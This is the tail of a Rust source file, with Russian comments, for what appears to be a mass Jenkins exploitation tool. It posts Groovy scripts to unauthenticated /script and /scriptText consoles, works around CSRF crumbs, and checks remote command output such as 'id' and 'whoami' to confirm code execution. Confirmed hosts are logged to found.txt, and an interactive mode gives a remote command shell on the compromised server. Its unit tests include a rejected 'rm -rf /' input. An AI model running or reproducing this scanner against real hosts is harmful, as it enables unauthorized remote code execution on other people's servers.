                ("/scriptText", false, crumb.as_str()),
                ("/scriptText", false, ""),
            ];
            for (ep2, pre2, crumb2) in combos {
                let out = post_script(
                    &client,
                    &format!("{base}{ep2}"),
                    crumb2,
                    &cookie,
                    &config.groovy,
                    &rl,
                )
                .await;
                post_status = out.status;
                log_line(
                    &mut logs,
                    &prefix,
                    &format!("  verify POST {ep2} crumb={} -> {}", if crumb2.is_empty() { "no" } else { "yes" }, out.status),
                );
                if let Some(p) = validate_verify(&out, &config.nonce, pre2) {
                    proof = Some(p);
                    proof_endpoint = Some(ep2.to_string());
                    break;
                }
                let low = out.body.to_ascii_lowercase();
                if out.status == 403 || low.contains("no valid crumb") || low.contains("forbidden") {
                    csrf_blocked = true;
                }
            }
        } else {
            for attempt in 0..POST_ATTEMPTS {
                // Повтор с той же сессией: crumb и POST используют один и тот же cookie.
                if crumb.is_empty() || attempt > 0 {
                    let (c, new_cookie) = fetch_crumb(&client, &u_crumb, &cookie, &rl).await;
                    if !new_cookie.is_empty() {
                        merge_cookie(&mut cookie, new_cookie);
                    }
                    if !c.is_empty() {
                        crumb = c;
                    }
                }
                if crumb.is_empty() {
                    log_line(&mut logs, &prefix, "  crumb=failed -> POST без crumb (CSRF off?)");
                } else {
                    log_line(&mut logs, &prefix, &format!("  crumb=ok ({})", if attempt == 0 { "wave" } else { "retry" }));
                }

                let out = post_script(&client, &url_post, &crumb, &cookie, &config.groovy, &rl).await;
                post_status = out.status;
                log_line(
                    &mut logs,
                    &prefix,
                    &format!("  POST {ep} attempt {}/{} ({}) -> {}", attempt + 1, POST_ATTEMPTS, config.command, out.status),
                );

                if let Some(p) = validate_proof(&out, &config.command, &config.nonce, from_pre) {
                    proof = Some(p);
                    proof_endpoint = Some(ep.to_string());
                    break;
                }

                let low = out.body.to_ascii_lowercase();
                if out.status == 403 || low.contains("no valid crumb") || low.contains("forbidden") {
                    csrf_blocked = true;
                }
                if (200..300).contains(&out.status) {
                    break;
                }
            }
        }
    }

    let short_proof = proof
        .as_deref()
        .unwrap_or("-")
        .chars()
        .take(60)
        .collect::<String>()
        .replace('\n', " ");
    log_line(&mut logs, &prefix, &format!("  POST status={post_status} proof={short_proof}"));

    let verdict = if !is_jenkins {
        "not_jenkins"
    } else if !script_anon {
        "no_anonymous_script_console"
    } else if proof.is_some() {
        "rce_confirmed"
    } else if csrf_blocked {
        "csrf_blocked"
    } else {
        "script_console_anonymous_proof_failed"
    };
    log_line(
        &mut logs,
        &prefix,
        &format!("  verdict={verdict} ({:.1}s)", started.elapsed().as_secs_f64()),
    );

    (
        ScanResult {
            url: base,
            version,
            is_jenkins,
            verdict: verdict.to_string(),
            anonymous_script_console: script_anon,
            proof_endpoint,
            proof,
            command: config.command.clone(),
            nonce: config.nonce.clone(),
            endpoints: Endpoints {
                root: root.status,
                script: codes[0],
                script_text: codes[1],
                crumb_issuer: codes[2],
                api: codes[3],
                manage: codes[4],
                configure: codes[5],
                plugin_manager: codes[6],
                system_info: codes[7],
            },
        },
        logs,
    )
}

fn prepare_path(path: &Path) {
    if let Some(parent) = path.parent() {
        if !parent.as_os_str().is_empty() {
            let _ = fs::create_dir_all(parent);
        }
    }
}

#[tokio::main]
async fn main() -> ExitCode {
    let chosen = match parse_input() {
        Ok(v) => v,
        Err(code) => return ExitCode::from(code as u8),
    };

    if let Input::Shell(t) = &chosen.input {
        let client = Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(SHELL_TIMEOUT_SECS))
            .connect_timeout(Duration::from_millis(CONNECT_TIMEOUT_MS))
            .user_agent(UA)
            .build()
            .expect("failed to build shell HTTP client");
        let rl = Arc::new(RateLimiter::new(None));
        shell_session(client, t.clone(), chosen.config.nonce.clone(), rl).await;
        return ExitCode::SUCCESS;
    }

    let (targets, batch) = match chosen.input {
        Input::Single(t) => (vec![t], false),
        Input::Batch(v) => (v, true),
        Input::Shell(_) => unreachable!(),
    };
    let total = targets.len();

    let config = Arc::new(chosen.config);
    let report_path = config.output_dir.join("found.txt");
    let _ = fs::create_dir_all(&config.output_dir);

    // В txt попадают только цели с валидным proof, без повторов между запусками.
    let mut known: HashSet<String> = fs::read_to_string(&report_path)
        .unwrap_or_default()
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect();

    let mut jsonl: Option<File> = None;
    if let Some(path) = &config.output {
        prepare_path(path);
        match File::create(path) {
            Ok(f) => {
                println!("JSONL: {}", path.display());
                jsonl = Some(f);
            }
            Err(e) => {
                eprintln!("[!] не могу открыть {} для записи: {e}", path.display());
                return ExitCode::from(2);
            }
        }
    }

    println!(
        "Целей: {} | команда: {} | nonce: {} | параллелизм: {} | rate limit: {}",
        total,
        config.command,
        config.nonce,
        config.parallel,
        config.rate_limit.map(|n| n.to_string()).unwrap_or_else(|| "-".to_string()),
    );
    println!("found.txt: {}", report_path.display());

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(TIMEOUT_SECS))
        .connect_timeout(Duration::from_millis(CONNECT_TIMEOUT_MS))
        .pool_max_idle_per_host(16)
        .user_agent(UA)
        .build()
        .expect("failed to build HTTP client");

    let rl = Arc::new(RateLimiter::new(config.rate_limit));

    let mut stream = stream::iter(targets.into_iter().enumerate().map(|(i, target)| {
        let client = client.clone();
        let config = Arc::clone(&config);
        let rl = Arc::clone(&rl);
        let prefix = if batch { format!("[{}/{}] ", i + 1, total) } else { String::new() };
        async move { (i, check_target(client, target, config, rl, prefix).await) }
    }))
    .buffer_unordered(config.parallel);

    let mut results: Vec<Option<ScanResult>> = vec![None; total];

    while let Some((i, (result, logs))) = stream.next().await {
        let prefix = if batch { format!("[{}/{}] ", i + 1, total) } else { String::new() };

        let short_proof: String = result
            .proof
            .clone()
            .unwrap_or_else(|| "-".to_string())
            .chars()
            .take(60)
            .collect::<String>()
            .replace('\n', " ");
        // Один write в консоль на цель вместо десятков — заметно быстрее на Windows.
        let mut out = logs;
        out.push_str(&prefix);
        out.push_str("RESULT ");
        out.push_str(&result.url);
        out.push_str("  ");
        out.push_str(&paint(&result.verdict, vcolor(&result.verdict)));
        out.push_str("  version=");
        out.push_str(if result.version.is_empty() { "-" } else { &result.version });
        out.push_str("  proof=");
        out.push_str(&short_proof);
        out.push('\n');
        print!("{out}");
        let _ = io::stdout().flush();

        if let Some(f) = jsonl.as_mut() {
            if let Ok(line) = serde_json::to_string(&result) {
                let _ = writeln!(f, "{line}");
                let _ = f.flush();
            }
        }

        // Только валидный proof (verdict rce_confirmed выставляется после валидации).
        if result.verdict == "rce_confirmed" && result.proof.is_some() && known.insert(result.url.clone()) {
            if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(&report_path) {
                let _ = writeln!(f, "{}", result.url);
            }
        }
        results[i] = Some(result);
    }

    println!("\n=== ИТОГИ ===");
    for (idx, slot) in results.iter().enumerate() {
        let r = slot.as_ref().expect("all results collected");
        println!(
            "{:2}. {:<30} {} {}",
            idx + 1,
            r.url,
            paint(&r.verdict, vcolor(&r.verdict)),
            if r.version.is_empty() { "-" } else { &r.version }
        );
    }

    let mut counts: BTreeMap<&str, usize> = BTreeMap::new();
    for slot in results.iter() {
        let r = slot.as_ref().expect("all results collected");
        *counts.entry(&r.verdict).or_insert(0) += 1;
    }

    let ordered = [
        "rce_confirmed",
        "csrf_blocked",
        "script_console_anonymous_proof_failed",
        "no_anonymous_script_console",
        "not_jenkins",
    ];
    for verdict in ordered {
        if let Some(&n) = counts.get(verdict) {
            if n == 0 {
                continue;
            }
            counts.remove(verdict);
            println!("  {}: {n}", paint(verdict, vcolor(verdict)));
            if verdict == "rce_confirmed" {
                for slot in results.iter() {
                    let r = slot.as_ref().expect("all results collected");
                    if r.verdict == verdict {
                        println!("    -> {}", link(&r.url));
                    }
                }
            }
        }
    }
    for (verdict, n) in counts {
        println!("  {}: {n}", paint(verdict, vcolor(verdict)));
    }

    println!("\nПодтверждено: {}", report_path.display());
    if let Some(path) = &config.output {
        println!("JSONL: {}", path.display());
    }

    if chosen.keep_console {
        pause_console();
    }

    ExitCode::SUCCESS
}

#[cfg(test)]
mod tests {
    use super::*;

    fn resp(status: u16, body: &str) -> Resp {
        Resp { status, headers: HeaderMap::new(), body: body.to_string() }
    }

    #[test]
    fn rejects_403_crumb_page_even_with_uid_like_text() {
        // Баг №1/№2: 403-страница «No valid crumb» раньше считалась выводом id.
        let body = "<html><pre>No valid crumb was included in the request</pre>\
                    <pre>uid=0(root) gid=0(root)</pre></html>";
        assert!(validate_proof(&resp(403, body), "id", "abc123", true).is_none());
        assert!(validate_proof(&resp(200, body), "id", "abc123", true).is_none());
    }

    #[test]
    fn rejects_error_markers_on_2xx() {
        for marker in ["Error 403", "No valid crumb", "Forbidden", "Exception", "Access denied"] {
            let body = format!("<pre>RCEPROOF_abc123:uid=0(root) {marker}</pre>");
            assert!(
                validate_proof(&resp(200, &body), "id", "abc123", true).is_none(),
                "marker {marker} должен отклоняться"
            );
        }
    }

    #[test]
    fn accepts_valid_proof_from_pre_only() {
        let body = "<html><div>шум</div><pre>RCEPROOF_abc123:uid=1000(user) gid=1000</pre></html>";
        let proof = validate_proof(&resp(200, body), "id", "abc123", true).unwrap();
        assert_eq!(proof, "uid=1000(user) gid=1000");
    }

    #[test]
    fn ignores_non_pre_body_on_script_endpoint() {
        // Баг №1: proof не должен браться из произвольного тела (не <pre>).
        let body = "RCEPROOF_abc123:uid=0(root)";
        assert!(validate_proof(&resp(200, body), "id", "abc123", true).is_none());
        // А для /scriptText text/plain допустим.
        assert!(validate_proof(&resp(200, body), "id", "abc123", false).is_some());
    }

    #[test]
    fn rejects_wrong_nonce_and_wrong_command_shape() {
        let body = "<pre>RCEPROOF_abc123:uid=0(root)</pre>";
        assert!(validate_proof(&resp(200, body), "id", "different", true).is_none());
        let body2 = "<pre>RCEPROOF_abc123:garbage output</pre>";
        assert!(validate_proof(&resp(200, body2), "id", "abc123", true).is_none());
        assert!(validate_proof(&resp(200, body2), "date", "abc123", true).is_some());
    }

    #[test]
    fn shell_groovy_and_output_roundtrip() {
        let nonce = "abc123";
        let b64 = B64.encode(b"echo 'hi' $HOME".as_slice());
        let g = shell_groovy(&b64, nonce);
        assert!(g.contains("RCE_SHELL_abc123:"));
        assert!(g.contains("decodeBase64()"));
        let payload = B64.encode(b"uid=0(root)\n".as_slice());
        let body = format!("<html><pre>RCE_SHELL_abc123:{payload}</pre></html>");
        assert_eq!(shell_output(&body, nonce).unwrap(), "uid=0(root)\n");
    }

    #[test]
    fn verify_mode_needs_exact_token_and_2xx() {
        let nonce = "abc123";
        let token = format!("{PROOF_MARKER}_{nonce}:{nonce}");
        assert!(groovy_verify(nonce).contains(&token));
        let err = resp(403, "<html><pre>Error 403 No valid crumb was included</pre></html>");
        assert!(validate_verify(&err, nonce, true).is_none());
        let ok_body = format!("<html><pre>{token}</pre></html>");
        let ok = resp(200, &ok_body);
        assert!(validate_verify(&ok, nonce, true).is_some());
        let stale = resp(200, "<html><pre>RCEPROOF_other:other</pre></html>");
        assert!(validate_verify(&stale, nonce, true).is_none());
    }

    #[test]
    fn nonce_in_groovy_allows_recrosscheck() {
        let g = groovy_for("whoami", "deadbeef").unwrap();
        assert!(g.contains("RCEPROOF_deadbeef:"));
        assert!(g.contains("whoami"));
        assert!(groovy_for("rm -rf /", "x").is_none());
    }

    #[test]
    fn crumb_parse_and_cookie_merge_keep_session() {
        let crumb = parse_crumb(r#"{"crumb":"abc","crumbRequestField":"Jenkins-Crumb"}"#);
        assert_eq!(crumb, "abc");
        let mut cookie = String::new();
        merge_cookie(&mut cookie, "JSESSIONID=old; Path=/".to_string());
        merge_cookie(&mut cookie, "JSESSIONID=new; Path=/".to_string());
        assert_eq!(cookie, "JSESSIONID=new");
    }
}
